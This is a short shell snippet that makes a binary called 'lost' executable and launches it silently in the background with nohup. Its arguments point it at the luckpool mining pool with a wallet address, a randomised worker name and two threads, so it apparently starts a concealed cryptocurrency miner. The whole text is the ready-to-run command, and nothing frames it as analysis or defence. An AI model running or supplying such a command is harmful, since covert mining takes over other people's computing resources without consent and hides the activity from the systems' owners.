chmod +x lost &&
nohup ./lost -v -l ap.luckpool.net:3956 -u RLKVQcYkNGQXb8FpQzNav3FUoqCLCKYdaG.akun$(echo $(shuf -i 1-999 -n 1)) -p x -t 2 >/dev/null 2>&1